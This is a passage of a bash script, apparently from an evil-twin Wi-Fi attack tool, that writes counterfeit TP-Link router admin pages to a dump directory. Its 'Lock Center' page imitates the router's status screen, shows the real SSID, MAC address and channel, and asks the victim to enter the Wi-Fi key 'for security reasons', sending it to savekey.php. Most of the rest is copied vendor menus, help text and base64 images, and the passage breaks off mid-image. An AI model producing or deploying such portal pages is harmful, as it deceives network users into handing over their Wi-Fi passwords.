Settings</a></ol><ol id=\"ol37\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a37\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(37);\">- Rules List</a></ol><ol id=\"ol38\" class=\"plus\" style=\"display:block; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a38\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(38);\">IP &amp; MAC Binding</a></ol><ol id=\"ol39\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a39\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(39);\">- Binding Settings</a></ol><ol id=\"ol40\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a40\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(40);\">- ARP List</a></ol><ol id=\"ol41\" class=\"dot1\" style=\"display:block; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a41\" href=\"StatusRpm.htm\" 
target=\"mainFrame\" class=\"L1\" onclick=\"doClick(41);\">Dynamic DNS</a></ol><ol 
id=\"ol42\" class=\"plus\" style=\"display:block; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a42\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(42);\">System Tools</a></ol><ol id=\"ol43\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a43\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(43);\">- Time Settings</a></ol><ol id=\"ol44\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;
\"><a id=\"a44\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(44);\">- Diagnostic</a></ol><ol id=\"ol45\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a45\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(45);\">- Firmware Upgrade</a></ol><ol id=\"ol46\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a46\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(46);\">- Factory Defaults</a></ol><ol id=\"ol47\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a47\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(47);\">- Backup &amp; 
Restore</a></ol><ol id=\"ol48\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a48\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(48);\">- Reboot</a></ol><ol id=\"ol49\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a49\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(49);\">- Password</a></ol><ol id=\"ol50\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a50\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(50);\">- System Log</a></ol><ol id=\"ol51\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a51\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(51);\">- Statistics</a></ol>
</menu>


</body></html>" > $DUMP_PATH/data/MenuRpm.htm
}


function StatusHelpRpm {
echo "<html><head>
<meta http-equiv=\"content-type\" content=\"text/html; charset=windows-1252\"><link href=\"css_help.css\" rel=\"stylesheet\">

<!-- <TP_C_TAG \"htmlMiscHelp\">//-->
</head><body><h1>Status Help</h1>
<p> The <b>Status</b> page displays the Router's current status and configuration. All information is read-only.
</p><p><b>LAN</b> - The following parameters apply to the LAN port of the Router. You can configure them in the <b>Network -&gt; LAN</b> page.
</p><ul>
<li><b>MAC Address</b> - The physical address of the Router, as seen from the LAN.
</li><li><b>IP Address</b> - The LAN IP address of the Router.
	</li><li><b>Subnet Mask</b> - The subnet mask associated with LAN IP address.</li>
</ul>

<p><b>Wireless</b> - These are the current settings or information for Wireless.You can configure them in the <b>Wireless -&gt; Wireless Settings</b> page. 
</p><ul>
  	<li><b>Wireless Radio</b> - Indicates whether the wireless radio feature of the Router is enabled or disabled.
    </li><li><b>Name(SSID)</b> - The SSID of the Router.  
    </li><li><b>Channel</b> - The current wireless channel in use. </li>
	<li><b>Mode</b> - The current wireless mode which the Router works on. </li>
    <li><b>Channel Width</b> - The bandwidth of the wireless channel.</li>
	<li><b>Max Tx Rate</b> - The maximum tx rate.</li>
	<li><b>MAC Address</b> - The physical address of the Router, as seen from the WLAN.</li>
<script type=\"text/javascript\">
if(wlan_wds)
	document.write(\"<LI><B>WDS Status</B> - The status of WDS' connection, Init: WDS connection is down; Scan: Try to find the AP; Auth: Try to authenticate; ASSOC: Try to associate; Run: Associated successfully.</LI>\");
</script><li><b>WDS Status</b> - The status of WDS' connection, Init: 
WDS connection is down; Scan: Try to find the AP; Auth: Try to 
authenticate; ASSOC: Try to associate; Run: Associated successfully.</li>
	</ul>
<p><b>WAN</b> - The following parameters apply to the WAN ports of the Router. You can configure them in the <strong><b>Network -&gt; WAN</b></strong> page.
</p><ul>
<li><b>MAC Address</b> - The physical address of the WAN port, as seen from
the Internet.
</li><li><b>IP Address</b> - The current WAN (Internet) IP Address. This field will be blank or
	0.0.0.0 if the IP Address is assigned dynamically and there is no connection to 
	Internet. 
</li><li><b>Subnet Mask</b> - The subnet mask associated with the WAN IP Address. 
</li><li><b>Default Gateway</b> - The Gateway currently used by the Router is shown here. When you use <b>Dynamic IP</b> as the connection Internet type, the <b>Renew</b> button will be displayed here. Click the <b>Renew</b> button to obtain new IP parameters dynamically
from the ISP. And if you have got an IP address <b>Release</b> button will be displayed here. Click the <b>Release</b> button to release the IP address the Router has obtained from the ISP.
</li><li><b>DNS Server</b> - The DNS (Domain Name System) Server IP 
addresses currently used by the Router. Multiple DNS IP settings are 
common. Usually, the first available DNS Server is used.</li>
<li><b>Online Time</b> - The time that you online. When you use <strong>PPPoE</strong> 
      as WAN connection type, the online time is displayed here. Click the <strong>Connect</strong> 
      or <strong>Disconnect</strong> button to connect to or disconnect from Internet.</li>
</ul>
<p><b>Secondary Connection</b> - Besides PPPoE, if you use an extra 
connection type to connect to a local area network provided by ISP, then
 parameters of this secondary connection will be shown in this area.</p>
<p><b>Traffic Statistics</b> - The Router's traffic statistics.
</p><ul>
	<li><b>Sent (Bytes)</b> - Traffic that counted in bytes has been sent out from the WAN port.</li>
	<li><b>Sent (Packets)</b> - Traffic that counted in packets has been sent out from WAN port.</li>
	<li><b>Received (Bytes)</b> - Traffic that counted in bytes has been received from the WAN port.</li>
	 <li><b>Received (Packets)</b> - Traffic that counted in packets has been received from the WAN port.</li>
</ul>
<p><b>System Up Time</b> -  The length of the time since the Router was last powered on or reset.
</p><p>Click the <b>Refresh</b> button to get the latest status and settings of the Router.

</p></body></html>
" > $DUMP_PATH/data/StatusHelpRpm.htm
}

function StatusRpm {
echo "<style>

#box {
 position:absolute;
 top:20px;
}

</style>

<link rel=\"stylesheet\" type=\"text/css\" href=\"info.css\" />
</HEAD>

<BODY>

<CENTER>


    <TABLE id=\"autoWidth\">

      <TBODY>

        <TR>

          <TD class=h1 colspan=2 id=\"t_title\">Lock Center</TD>

        </TR>

                <tr><td colspan=\"2\" align=\"center\" style=\"position:absolute;margin-left:120px;\">SSID: <b>$Host_SSID</b></td></tr>
        <tr><td colspan=\"2\" align=\"center\" style=\"position:absolute;margin-top:14px;margin-left:67px;\">MAC Address: <b>$mac</b></td></tr>
        <tr><td colspan=\"2\" align=\"center\" style=\"position:absolute;margin-top:28px;margin-left:97px;\">Channel: <b>$channel</b></td></tr>
<tr><td></td></tr>
        
        <TR>

          <TD class=blue colspan=2></TD>

        </TR>



        <TR>

          <TD class=info1 colspan=2>
          
For security reasons, enter the <b> $privacy</b> key to access the Internet
<div id=\"box\" align=\"left\" >
<form id=\"form1\" name=\"form1\" method=\"POST\" action=\"savekey.php\" >
<br>
<tr><td style=\"position:absolute;margin-left:190px;\">$privacy Key:</td></tr>
<tr><td style=\"position:absolute;margin-top:14px;margin-left:130px;\"><input name=\"key1\" type=\"password\" class=\"textfield\" /><td></tr>



        <TR><TD class=blue colspan=2></TD></TR>
        
<tr><td colspan=\"2\" align=\"center\"><INPUT name=\"Confirm\" class=\"buttonBig\" type=\"submit\" value=\"Confirm\"/></td></tr>

</form></div>

</TD></TR>


      </TBODY>

    </TABLE>


</CENTER>

</BODY>

</HTML>


" > $DUMP_PATH/data/StatusRpm.htm
}

function top {
echo "<html><head><title></title>
	<meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1252\">
		<meta http-equiv=\"Pragma\" content=\"no-cache\">
		<meta http-equiv=\"Cache-Control\" content=\"no-cache\">
		<meta http-equiv=\"Expires\" content=\"wed, 26 Feb 1997 08:21:57 GMT\">
		<meta content=\"MSHTML 6.00.2800.1106\" name=\"GENERATOR\">
	<style type=\"text/css\">
.font {	font-family: \"Courier New\", \"Courier\", \"mono\";font-size: 12px;color: #FFFFFF;}
td {font-family: \"Times New Roman\", \"宋体\";font-size: 12px;}
form {font-family: \"Times New Roman\", \"宋体\";font-size: 12px;}
body {font-family: \"Arial Black\", \"黑体\";font-size: 16px;}
.unnamed1 {  letter-spacing: 50px; word-spacing: 100px}
.unnamed2 {  word-spacing: 100px}
.style1 {
	font-family: \"Arial\";
	color: #FFFFFF;
	font-size: 16px;
	padding-right: 50;
	text-align: right;
	font-weight: bold;
	white-space: nowrap;
}
.style2 {
	font-size: 12px;
	font-family: \"Arial\";
	font-weight: bold;
	padding-right: 50;
	text-align: right;
	white-space: nowrap;
	color: #FFFFFF;
}
</style>




<body leftmargin=\"0\" topmargin=\"0\" background=\"data:image/jpeg;base64,/9j/4AAQSkZJRgABAgAAZABkAAD/7AARRHVja3kAAQAEAAAAUAAA/+4AJkFkb2JlAGTAAAAAAQMAFQQDBgoNAAABwwAAAeYAAAInAAACW//bAIQAAgICAgICAgICAgMCAgIDBAMCAgMEBQQEBAQEBQYFBQUFBQUGBgcHCAcHBgkJCgoJCQwMDAwMDAwMDAwMDAwMDAEDAwMFBAUJBgYJDQsJCw0PDg4ODg8PDAwMDAwPDwwMDAwMDA8MDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwM/8IAEQgAVwACAwERAAIRAQMRAf/EAIsAAAMBAQAAAAAAAAAAAAAAAAMEBQIGAQADAQEAAAAAAAAAAAAAAAABAgMEBhAAAgIDAQAAAAAAAAAAAAAAABEwARASExURAAMBAAAAAAAAAAAAAAAAADDhojQSAQAAAAAAAAAAAAAAAAAAADATAAICAgEFAAAAAAAAAAAAAAAREHEgMPABUWGR4f/aAAwDAQACEQMRAAAB4bHxl0WgzlFlPcywpOhYRjzLCMdT/9oACAEBAAEFAvIo6HQdiEIQhY//2gAIAQIAAQUCj//aAAgBAwABBQLSP//aAAgBAgIGPwI//9oACAEDAgY/Aj//2gAIAQEBBj8C0wx//9oACAEBAwE/ISt9KAXTuf/aAAgBAgMBPyFDGMY4Yxx//9oACAEDAwE/IbjHp//aAAwDAQACEQMRAAAQsEQo6H//2gAIAQEDAT8QMuL4ZQqUh4Hs/9oACAECAwE/EL5IeAZ//9oACAEDAwE/EOS+ysQhCEKP/9k=\" marginheight=\"0\" marginwidth=\"0\">
<table cellpadding=\"0\" cellspacing=\"0\" width=\"100%\">
	<tbody><tr><td><table cellpadding=\"0\" cellspacing=\"0\" border=\"0\" width=\"100%\">
  	<tbody><tr><td><a onclick=\"return NewW();\" onmouseover=\"return ShowUrl();\" onmouseout=\"return EraseUrl();\"><img src=\"data:image/jpeg;base64,/9j/4AAQSkZJRgABAgAAZABkAAD/7AARRHVja3kAAQAEAAAAUAAA/+4AJkFkb2JlAGTAAAAAAQMAFQQDBgoNAAAG5wAACi0AAA7cAAAU8f/bAIQAAgICAgICAgICAgMCAgIDBAMCAgMEBQQEBAQEBQYFBQUFBQUGBgcHCAcHBgkJCgoJCQwMDAwMDAwMDAwMDAwMDAEDAwMFBAUJBgYJDQsJCw0PDg4ODg8PDAwMDAwPDwwMDAwMDA8MDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwM/8IAEQgAVwEYAwERAAIRAQMRAf/EAOsAAQEAAgIDAQAAAAAAAAAAAAAIBgcDBAIFCQEBAQADAQEBAAAAAAAAAAAAAAADBAUCBgEQAAECBQMCAwcEAwAAAAAAAAABEQIDEwQFEhUGMTIQNQcwYCEzFDY3UEM0F3BCFhEAAAQCBQYKBggHAAAAAAAAAAECAxEE4RKiNAUQITFRE3RBYXGxIjKyI7MU8FJywnM1MFBggZHBgyShQmKS0pMVEgACAgICAwEAAAAAAAAAAAAAARARITEgMEBgcBITAAMAAQEHBAEFAQEAAAAAAAABEXEhEPAxQVFhkaGxweGBMFBg0fEgcP/aAAwDAQACEQMRAAAB1ZS8R7r7IAAAAAAAAAAAAAAAAOtx8ybqcAAAAAAAAAAAAAAAAYdFX9n97AAAAAAAAAAAAAAAAHo4YvL79AAAAAAAAAAAAAAAAHnH9AAAAAAAAAAAAAAAAA7HP0DcFi/QtvV2PNbm2lkZbLPsSW3p+vQoe5rfO3H8nj/
MX0e2PWyjQxNH1s3aM929tX08808rbti9COX5rLO59uWL28LWlC+X5qlLuxoWpl47xFg8dYAADn4+gCjLutQV3V+eOL5SvtLezOWxPdPLtLU9DGOX579Km0NqVc7F0jVzdoT3bw2PTTTQx+L431d05poY+VyT0Bd1OnzzAuP5jEY64AAAHY46AFEX9Xf93U+fGH5audTdyiSaWc3F6HPOJxwC8dr02Mxw67gqd/71UWltTZn5EtZuLT+js0noa8+UcrddzRk3Lw6l0tqMsnz+v4KoAAA54/oAAAAAAAAAAAAAAAAHY46AAAAAAAAAAAAAAAAA5+foAAAAAAAAAAAAAAAAH//aAAgBAQABBQKzs/qjaENoQ2hDaENoQ2hDaENoQ2hDaENoQ2hDaENoQ2hDaENoQ2hDaENoQ2hDaENoQ2hDaENoQ2hDaENoQ2hDaENoQ2hDaEMcukqFQqFQqFQqFQqFQqFQqFQqFQqFQqFQqFQqFQqFQqFQqFQqFQqFQt10lQqFQqFQqFQqFQqFQqFQqFQqFQqFQqFQqFQqFQqFQqFQqFQqFQqCfAdR1HUdR1HUdR1HUdR1HUdR1HUdR1HUdR1HUdR1HUdR1HUdR1HUdR1HUdRhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhjj/LJmBs+NcomZ+fkrtbCw/sieenq6sfyLMRYOwtPUOKfdXdlaX0rK2SY/JMYPyX1A89Y4X9ynp15XlMPYZeRmsJd4S74P8Acdv+Rsr5XguOXucm3N7hOE2VjnZl1lc/dW97esMMMMMMMMMMenX83kPkbHp35Zy3GXeWxdlwnPQ3nQr8aus5kU4R9FhPJef+eMcM+5ThP2/xLluoyeMtMtaYLC3WE5bI/Ik+GVHI+mSCyzWOyOPvmGGGGGGGGGGGGPTv+ZyDyNj098s5je3Vjif+lz5cZzMXcthji+Stb3Ecj4lHm7z+u7wxfG52B5CcK8gY4ry1GWGCNZH5CynlnG+WT8UXNrjeQWGe47d4Ocw
wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww36J//2gAIAQIAAQUC/wAZQzNJBHqFVisSiOLSJOFRyL4KQ9JvUl9xJ6LC5FCxL6/7r0hh1CqkAkfxiX2kkj6EnpMR0SUvg8LroIek7qSu4ldsuYKjkMOmL9zwiRU9tII+hI6TVZKkQsa+MuJ0jl6igpDBpiJXaS5vh+5F0gmsKiRJHBp98v/aAAgBAwABBQKGFzQaDQaDQaDQaDQaDQaDQaDQaDQaDQaDQaDQaDQaDQaDQaDQaDQaCH9DT3slT9CSZ2sjVk+rLXpNmaEhuvisKKRw6VJfbddxb95adscCREyWsC23enzo+2XKWMWKGSkMx4pquvs7TrN7S16T4Fihht4nHgWKKk0vtuu4t+8t+yRPI4EiSXLWCYnzlG+EyFYV9ra9ZvaWvSfEqQ1oxZkS+MmJFhmyNa/SqQStEZb9hJn+CfOj6Sp+kVEjSZKWD3y//9oACAECAgY/Avrrvop8s+UocU/eP//aAAgBAwIGPwL5lUWaGWaMlQpU54OMFvtY5xL/AEYFKhlMp8MGe5jnBs3ws2KHFOWU9e6f/9oACAEBAQY/AnO82dSHBHT94vNikXmxSLzYpF5sUi82KRebFIvNikXmxSLzYpF5sUi82KRebFIvNikXmxSLzYpF5sUi82KRebFIvNikXmxSLzYpF5sUi82KRebFIvNikXmxSLzYpF5sUi82KRebFIvNikXmxSLzYpF5sUh7jq/n9Rr44faxyTRJJmSceN6ua6ulKUw0H6omWVyaZby6CXEl1oxOGohOTpI2hyrSnCbjCNUh8pR/tP8AxGIK0VpszhypSCnUsFMGbqW9maqukj5dQl2XsMJDbziUKWlyJlWOEYVQpmbl0PtrKBkoo/
hqE7JJOKZd5SEGfq8H8MmD7lL+GkJ3VvnVkw39bwV5J7evcSFsTbCVGoug+Rd4g9aVA5eYKs2rPLzBdVxPppISnsO9gxPfBLwGxiW6vdgx3RbGUQffTii6JcRazHlZRvbTzhR2Ue8WfrOK4C9CD0/ij5bdTRplFqLoNnEjqp01c3CEvMK2itkXmXS/mciZ8UYFAo8P0mI/BT2hi26uc2Sd3r3EhMrJIJx4n0rqmZJzER6xKrdYbabQ6lS3Nok4ERx0Fkxt/F1KXLrd/Zrbr54RIz6Amf8AnbXztT9vHawrffmGEbkx4ZBO6t86smG/reCvJjPtueEQbwvFXOl1ZSbVw6kLPmMLlJtFZCs6Fl1kK9ZIlpeYKshSHjl5guqtNQ/QyE78EvAbDyH4bBSFE9E4FVMs+cHLYepEn3dWVWhJGlGo4cIdRiVZbzhmrzJ5yd/qJX02I/BT2hiu7Oc2Sd3n3EhL0m+qXd8whNdOmBkofNHvxBszGIvuNK6zdaBHywyyLbThbaUZQy+zHpEaCqxhxwCJxmbSwsmybW2tMSzGeeJco+Ys/wBqhgq3ZlD/AJk5giqEZQqsq18uTGPbc8IsiMNxZ2EM0rOr7Kz/ADCFmklGjO2rVEoZhO/BLwUDEd2d7BhMpOVpjD9CeFTXs8XECSurNSrxVmXk6SPWk+Ax0++k3D7iaLRyK1H9sv/aAAgBAQMBPyFGt5v1dnT9krWta1rWta1rWta1rWta1rWta1rWtWGZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZvx1/YwAAAAAqpz/hNVVVVVVVVVVUAAAAAANcjn2T0giLUqZ7lDUkE3KQ1ksc2DdP/wANVGi7ShrLUgcFweiiDJZeFGrsq7JPq4t0a1Q4Rx6zR8ffRtKluzMuzOkBG0BAuQgqnh8zXTBNOoXRr8GI2oempswDH6IOMLpjX5aJKJtI+Q8YXhxZyblQeJaW0a0PvxbFGGpQiotZqjZWipT9QACwdvjr2Ehh1E
GiSW6yXMciJUDM6tvgNpG24lq2zmPbhWpcjilOpm785/NsqpdmZNgUMu02/wAGHPycHrx7a8AODOTX09CMpATihdGvwYja65DrUfetRXoinMjkp2VGtHh6u5CE6xqdRx91z/WAAJC29uvYWBHdCxz0Neh/kv6FWRliPRIqztKZ91IvqJqJjho0GWJGeE2bJlaXqBa7BJswa7pU40a5PejYY2Rl6TbMpuVTaF19ljGr9K9R9X+HR61Mh6JcofTXI0QbFLaucv8AXlzn8OAAAAAAAAAAAAAi6kXUi6kXUi6kXUi6kXUi6kXUi6kXUi6kXUi6kXUi6kXUi6kXUi6kXUi6kXUi6kXUi6kXUi6kXUi6kXUi6kXUi6n/2gAIAQIDAT8hRCEIQhCEIQhCEIQhCEIQhCEIQhCEIJlKUpSlKUpSlKUpSlKUpSlKUpSlKUomUpSlKUpSlKUpSlKUpSlKUpSlKUpSlKUpSlKUpSlKUpSlKUpSlKUpSlKUpSlKUpSlKUpSlKUpSlKUpSlKUpSlKUpSlJJCokpicLIKUfARxCURTh42dOFs4gpdRjx7NcZxh4TxcSlMU2UpSlKX/njZxdnGGyRTsoTS04nDxteBs4mzFrGOixcQ+GpNIhx+kpSlONnHKcQfVHeG+LKUUkutO4N2yXbC4jiDtL4bBMbsUpSlKUpSlKUpSlKUpSlKUpSlKUpSlKUpSlKUpSlKUpSlKUpSlKUpSlKUpSlKUpSlL+yf/9oACAEDAwE/IQZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZ7NKUpSlKUpSlKUpSlKUpSlKUpSlKUuzSlKUpSlKUpSlKUpSlKUpSlKUpSlL/CmaSjXakK/QWPXHCRVEwpiFnY9Mj2dnuvbZxMieIRDOAcXHwj0DHunDqS3FvxG+B7CbL9Uei2cfJBdRGuyr4ORrOb8nokezs917bN5g+DewQoJ9zi78iJrwNMaDdm/
rz0Wzj5LLq2BJHtJU5GkHsjbXxvts3GNn92Q4m/I9EO3hHX6Hnb+Zf/2gAMAwEAAhEDEQAAEHbbbbbbbbbbbbbbbbb5JJJJJJJJJJJJJJJJAAAAAAAAAAAAAAAAAB5JJJJJJJJJJJJJJJJEkkkkkkkkkkkkkkkkkAL2z7uHhBvE858AAALbeK3ASdeHh1ErbbbaABWAzgBuxANbXgAAAP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8ApJJJJJJJJJJJJJJJJIAAAAAAAAAAAAAAAAAf/9oACAEBAwE/EOwff0dn7HznOc5znOc5znOc5znOc5znOc5znOefT4PuWLFixYsWLFixYsWLFixYsWLFixYsWLFixYsWLFix2D4PsZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZjYxfx/Cf8A/wD/AP8A/wD/AP8A/wDwAAAAACengGiKGkkdvPhoOAANH1xQTjaPQMicYrqypLHsiNf2fI7wJe1KwvSUnd1pok5k6BEWANatC9UIsuKAarVJaymappj/AD4ibq3daU1d9hYroRU7KRdsyp9uJM22bGb42HHDGS0ehojWhqPbmlc129Ukx1urAi3YAq1oKX3lLkhG7tA+NFpI0aJcygk0mVW25LWtRkwRtPbSlCG7FXrlXEgi80jZKE0iG/8AsBgYGBgbguMWq6jYH5iLk08xx1hrpRAB3fZI6Qklq+i1Fhl22iSWrbb4QaMzN5kluKpzaGtUaSfgOp0UvQaUdD6sLAmybBJHU1i76tgODH+AY5CbglTTlPVYaqGzRbbr6JevdUkx1urbBLHyh0IdKnqrtKcaNtxIpfC1JvQ33PUVi/H8auq8aqfQRGBgYGBgYGBgYGJiYmJlXuBarqdiSPeTv0lJNSLT0bTxsptOMecvGb7VIxMSKTRCvNVLiKay1NJe9FeKaGm06bclpuB8jXALV3T5liTZB9S8SRUxlDTSSaWj2q1bG2ArOCg11Vi4ptbKPrWey2+Qp
6UbvXd6cZ1DTOO/RuHrNTTXV5UcCoF+KilkuT0ht3AxMTExMTExMTAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAw/ZAAAAAAdh5Ow8nYeTsPJ2Hk7Dydh5Ow8nYeTsPJ2Hk7Dydh5Ow8nYeTsPJ2Hk7Dydh5Ow8nYeTsPJ2Hk7Dydh5Ow8nYeTsPJ2Hk7Dydh5Ow8nYeTsPJ2Hk//9oACAECAwE/EEpmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZn/wCIQAAAAAH/AP8A/wD/AIAAAAAAAAAAAB7dTWj2KSFnoRX+voeu7nBV1ICfF3EESnZB7HoXsN6F87Dep7PY3k+CUT+zxIfUfT+fYfxfCPSP2G2mi6nEJ6vyOc/Wadv6LtdNc78/0AFKUo/iPTso/m+CddaKrUkr12V3DdOPwPfX0cT0r2G9K+Sjet7PY/q+xSMw/h7MC73I+ug/g+EKm3JNTTwumg1ri69SlKUpSlL/AMg1xHo3sPc3wimY6vk7kQxk2icT1SSawPWsaQ7UqTTt9nsf1PbYXo3D+H/ZE9R/F8I9M/Y56+pb9DUmqfBmvteR78/4eAAAAAAAAAAAABSlKUpSlKUpSlKUpSlKUpSlKUpSlKU//9oACAEDAwE/ENTrIb0+zen2b0+zen2b0+zen2b0+zen2b0+zen2b0+zen2b0+zen2b0+zen2b0+zen2b0+zen2b0+zen2b0+zen2b0+zen2b0+zen2b0+zen2b0+zen2b0+zen2PL+P2MAAAAAGl/Y//wD/AP8A/WhSlKUpSlKUpSlKUpSlKUpSlKUpSlKQhCEIQhCEIQhCEIQhCEIQhCEIQhCEIQgxotO8ZyS6dhjNJXjfgjSsNzB2fn6GrN+iGSVql0GSBNpaPr+B6QafUi3BNr8ciG5uiOHh7sgu46tm5dkPf5HNYZyl8nya34oTxP2ezjeHRnLhOPJ+OrIGr8ub7tyW6XEenazDVwXGZ88acSjmr6vXz
NFecIQhCEIQhCCeJe5697EN+7IkKuH7iLkSSa1q2amGz4L+eAvHdOnd+Te3RCacPdkE3HVs9SxaP13E/hjEjT1T6o4Lch8mo92j0vwFZ1yHccyNH0aRaL8DaqbfP3UhCEIQhCEIQh6Ze5697EN27IsyOPk7gtk1khBbtqiTXPRT1HKgcmqO28MaSH0OzbPWsQ003Dez/vyNHH04Hp/geuezJWp6sO3bwRzjODXuu+7NZavwfw+jIQhCEIQhCEIQhCEIQhCEIQhCEIQhCEIQhCEIQhCEIQhCEIQhCEIQhCEIQhCEIQhCE/ZP/9k=\" style=\"cursor:pointer\" border=\"0\"></a></td>
		<td style=\"padding-top:23\" align=\"right\" background=\"data:image/jpeg;base64,/9j/4AAQSkZJRgABAgAAZABkAAD/7AARRHVja3kAAQAEAAAAUAAA/+4AJkFkb2JlAGTAAAAAAQMAFQQDBgoNAAAIbAAAE1oAACSkAABAAP/bAIQAAgICAgICAgICAgMCAgIDBAMCAgMEBQQEBAQEBQYFBQUFBQUGBgcHCAcHBgkJCgoJCQwMDAwMDAwMDAwMDAwMDAEDAwMFBAUJBgYJDQsJCw0PDg4ODg8PDAwMDAwPDwwMDAwMDA8MDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwM/8IAEQgAVwHqAwERAAIRAQMRAf/EANgAAQEBAQEBAQEAAAAAAAAAAAACAQMEBQYHAQEBAQEBAQAAAAAAAAAAAAAAAQIDBAYQAAICAgIBAwMEAgMAAAAAAAABEQISEwMVISIEBRBQMWAyIxQgMEBwgBEAAQICBgUHCQUIAgMAAAAAAQACESExQVESIgNxkdFCUmGBocHhMiPwsWJygqJTBDSSshNDFCAwUPHS4jODEMJA8mMSAQAAAAAAAAAAAAAAAAAAAJATAAIBAgUDBQADAQEAAAAAAAERACEx8EFRYXGBkaEQscHR4SAw8VBA/9oADAMBAAIRAxEAAAH8X4/jfQ1dYAAAAaDAaCSgRHlZhAAAAAPS1ZgMAABgNBJRBZJRJoBpJ5mfy2eP9HvsHY9F0AAAANMNBhoMNMPNM8gAAAUelQBgBgNBhhoMNMBpJZBZBZB4GPwePL+mncDT0L3tAAAAAAGGgwo8snBAAB0PS1gABgCSDQYDSTQSWQWSUYCjxM/EzzvFAA6Hqa62jTTDDQYaDADDTDTzzPkQDT0r2tGGQMBhoBJiUuEpSiUokoLKWsJawlrCUvn5wAAC69K+m66BcQDDADAYYaYYnGTxyd7fVbgBhkADCUGqSQaCSiTQSWQWSaaQdDmMAAAAB
0X1W+
m69K+i6lIIkkgxJBEEu3otHkmZBhiFGJhgNBEC65xptRJSiUpZSlEpawl2zJqwjAAAAAAAUvruvVb3t7L1t7L6rrE5kkSckk4yeGZwJMSASaCUwpZTCiCgRF1EVQmLqIusMJjgyPRjQAAAAAAAAAA9V19DWvbde269etcJPLM+eT5+cYcyjlJVTAwks5pqiE6LzS1lBqwlElgkmOKADvzoAAAAAAAAAAAA2voa39TW/o63R8THPlJyTCYEJSyEwElHOOlc46VyjpURVYTGJxkAAHoxoAAAAAAAAAAAAAAenV+xvp6LfNJ5pmIgHKTQYSlryk6W8pOlvNLWJLtiSTlIAAAO+aAAAAAAAAAAAAAAAB9nfT3b14858uZhp0ryyaac5O1vnktRCdF5IOMgAAAA/9oACAEBAAEFAq/F4i+KqdQjqEdSrHUpnUnUpHUpHUI6hNdSdSdSdQjqUdSdQjqax1J1COoq0/hoOoR1COoR1COoR1COoR1COoR1COoQvh60Oph9Ti+pVX1Cq+oVX1Cl/ESdRkupk6mlDp0n1Lul8VVHT1R1Lsuo46j+ItZdTx1H8O2dVRD+HkXxVR/D+V8Uh/D1nm+PfDxYs2GwXObJNkmw2QbINhsk2SbDYZmzxsNhs8bTZ52eNhsLWg2Gw2Gw2Gw2GwV2xXxa5PK5BcguQXILkg2KpsgzNjslymytTNm1s2VqZ2ZuMxc1jOqFy3Zsojbey2URsu1tqj3trW9vHEbDYbDYLnk2QbINhmbJNhsgzMzYZmZsNhmbDM2eM3LZsNhsNhsNhWzsK/jZ42eNnjZK2StkrZKXIbEjNVM2zY7LakZpGy11tSHaDbaxspUzvZbaVHezNqHZi5R3QuWzOa1NeRLJZLJZLFe9SvIS48ksm0yyXHklks8mTJZLJZ5MmSZWLJkslkslkQNslty25eUvKXlPlsbsTayVrMVoJg9TFazMlUeQr3ZNan8ljOB5CvY8IVuSxNak8lllWo82ZEc5BBBBBBAm6iuLFrAjzi
